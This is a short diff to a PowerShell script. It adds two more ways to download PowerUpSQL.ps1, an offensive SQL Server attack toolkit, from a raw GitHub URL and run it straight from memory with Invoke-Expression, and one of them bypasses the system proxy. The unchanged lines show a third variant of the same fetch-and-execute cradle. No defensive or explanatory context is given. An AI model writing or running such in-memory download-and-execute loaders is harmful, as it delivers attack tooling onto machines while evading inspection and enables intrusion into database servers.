@@ -6,3 +6,25 @@ $reader = New-Object IO.StreamReader $response.GetResponseStream()
 $scriptContent = $reader.ReadToEnd()
 $reader.Close()
 Invoke-Expression $scriptContent
+
+
+
+
+$url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
+$scriptBytes = $wc.DownloadData($url)
+$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes)
+Invoke-Expression $scriptContent
+
+
+
+$url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
+$request = [System.Net.WebRequest]::Create($url)
+$request.Method = "GET"
+$response = $request.GetResponse()
+$stream = $response.GetResponseStream()
+$reader = New-Object System.IO.StreamReader($stream)
+$scriptContent = $reader.ReadToEnd()
+$reader.Close()
+Invoke-Expression $scriptContent
